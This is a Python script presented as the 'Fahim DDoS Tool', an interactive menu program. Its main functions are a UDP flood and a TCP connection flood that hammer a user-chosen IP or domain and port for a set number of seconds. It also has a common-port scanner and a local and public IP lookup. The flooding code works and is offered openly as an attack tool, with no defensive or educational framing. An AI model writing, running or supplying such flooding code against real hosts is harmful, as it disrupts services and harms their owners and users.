#!/usr/bin/env python3
"""
Fahim DDoS Tool - Simple Version
Developer: Foysal Ebne Fahim
"""

import os
import sys
import time
import socket
import random
import threading

# Colors for terminal
class Colors:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    C = '\033[96m'
    W = '\033[97m'
    E = '\033[0m'

def clear():
    os.system('clear')

def banner():
    clear()
    print(f"""{Colors.C}
╔══════════════════════════════════════╗
║   Fahim DDoS Tool - Simple Version   ║
║   Developer: Foysal Ebne Fahim       ║
║   GitHub: foysal0078                 ║
╚══════════════════════════════════════╝{Colors.E}""")

def menu():
    print(f"\n{Colors.Y}[ MENU ]{Colors.E}")
    print(f"{Colors.G}[1]{Colors.E} UDP Attack")
    print(f"{Colors.G}[2]{Colors.E} TCP Attack")
    print(f"{Colors.G}[3]{Colors.E} Port Scan")
    print(f"{Colors.G}[4]{Colors.E} Network Info")
    print(f"{Colors.R}[0]{Colors.E} Exit")

def udp_attack():
    print(f"\n{Colors.Y}[ UDP ATTACK ]{Colors.E}")
    
    # Get target
    target = input(f"{Colors.C}Enter IP or Domain: {Colors.E}")
    
    # If domain, convert to IP
    if '.' in target and not target[0].isdigit():
        try:
            target = socket.gethostbyname(target)
            print(f"{Colors.G}IP Found: {target}{Colors.E}")
        except:
            print(f"{Colors.R}Domain Error!{Colors.E}")
            return
    
    # Get port
    try:
        port = int(input(f"{Colors.C}Port (default 80): {Colors.E}") or "80")
    except:
        port = 80
    
    # Get time
    try:
        seconds = int(input(f"{Colors.C}Time (seconds): {Colors.E}"))
    except:
        seconds = 30
    
    print(f"\n{Colors.R}Starting attack on {target}:{port}{Colors.E}")
    print(f"{Colors.Y}Time: {seconds} seconds{Colors.E}")
    
    sent = 0
    start = time.time()
    
    try:
        while time.time() - start < seconds:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)
                sock.sendto(data, (target, port))
                sent += 1
                sock.close()
                
                # Show progress
                elapsed = time.time() - start
                print(f"\r{Colors.G}Sent: {sent} | Time: {elapsed:.1f}s{Colors.E}", end="")
            except:
                pass
    except KeyboardInterrupt:
        print(f"\n{Colors.Y}Stopped!{Colors.E}")
    
    print(f"\n{Colors.G}Attack finished!{Colors.E}")
    print(f"Total packets: {sent}")

def tcp_attack():
    print(f"\n{Colors.Y}[ TCP ATTACK ]{Colors.E}")
    
    target = input(f"{Colors.C}Enter IP or Domain: {Colors.E}")
    
    if '.' in target and not target[0].isdigit():
        try:
            target = socket.gethostbyname(target)
            print(f"{Colors.G}IP Found: {target}{Colors.E}")
        except:
            print(f"{Colors.R}Domain Error!{Colors.E}")
            return
    
    try:
        port = int(input(f"{Colors.C}Port (default 80): {Colors.E}") or "80")
        seconds = int(input(f"{Colors.C}Time (seconds): {Colors.E}"))
    except:
        port = 80
        seconds = 30
    
    print(f"\n{Colors.R}Starting TCP attack...{Colors.E}")
    
    sent = 0
    start = time.time()
    
    try:
        while time.time() - start < seconds:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect_ex((target, port))
                sent += 1
                sock.close()
                
                elapsed = time.time() - start
                print(f"\r{Colors.G}Connections: {sent} | Time: {elapsed:.1f}s{Colors.E}", end="")
            except:
                pass
    except KeyboardInterrupt:
        print(f"\n{Colors.Y}Stopped!{Colors.E}")
    
    print(f"\n{Colors.G}Attack finished!{Colors.E}")
    print(f"Total connections: {sent}")

def port_scan():
    print(f"\n{Colors.Y}[ PORT SCANNER ]{Colors.E}")
    
    target = input(f"{Colors.C}Enter IP or Domain: {Colors.E}")
    
    if '.' in target and not target[0].isdigit():
        try:
            target = socket.gethostbyname(target)
            print(f"{Colors.G}IP Found: {target}{Colors.E}")
        except:
            print(f"{Colors.R}Domain Error!{Colors.E}")
            return
    
    print(f"{Colors.C}Scanning {target}...{Colors.E}")
    
    # Common ports
    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]
    
    open_ports = []
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                print(f"{Colors.G}[+] Port {port} - OPEN{Colors.E}")
                open_ports.append(port)
            else:
                print(f"{Colors.R}[-] Port {port} - CLOSED{Colors.E}")
        except:
            print(f"{Colors.Y}[!] Port {port} - ERROR{Colors.E}")
    
    print(f"\n{Colors.C}Scan finished!{Colors.E}")
    if open_ports:
        print(f"Open ports: {open_ports}")
    else:
        print("No open ports found.")

def network_info():
    print(f"\n{Colors.Y}[ NETWORK INFO ]{Colors.E}")
    
    try:
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        print(f"{Colors.C}Local IP: {Colors.W}{local_ip}{Colors.E}")
        print(f"{Colors.C}Hostname: {Colors.W}{socket.gethostname()}{Colors.E}")
        
        # Try to get public IP
        try:
            import urllib.request
            public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
            print(f"{Colors.C}Public IP: {Colors.W}{public_ip}{Colors.E}")
        except:
            print(f"{Colors.C}Public IP: {Colors.W}Not available{Colors.E}")
    
    except Exception as e:
        print(f"{Colors.R}Error: {e}{Colors.E}")

def main():
    try:
        while True:
            banner()
            menu()
            
            choice = input(f"\n{Colors.C}Select: {Colors.E}")
            
            if choice == '1':
                udp_attack()
                input(f"\n{Colors.G}Press Enter...{Colors.E}")
            
            elif choice == '2':
                tcp_attack()
                input(f"\n{Colors.G}Press Enter...{Colors.E}")
            
            elif choice == '3':
                port_scan()
                input(f"\n{Colors.G}Press Enter...{Colors.E}")
            
            elif choice == '4':
                network_info()
                input(f"\n{Colors.G}Press Enter...{Colors.E}")
            
            elif choice == '0':
                print(f"\n{Colors.G}Thanks for using!{Colors.E}")
                break
            
            else:
                print(f"{Colors.R}Wrong choice!{Colors.E}")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n{Colors.Y}Program stopped!{Colors.E}")
    except Exception as e:
        print(f"{Colors.R}Error: {e}{Colors.E}")

if __name__ == "__main__":
    # Check if running in Termux
    if 'com.termux' in os.getcwd():
        print(f"{Colors.G}Termux detected!{Colors.E}")
    
    main()
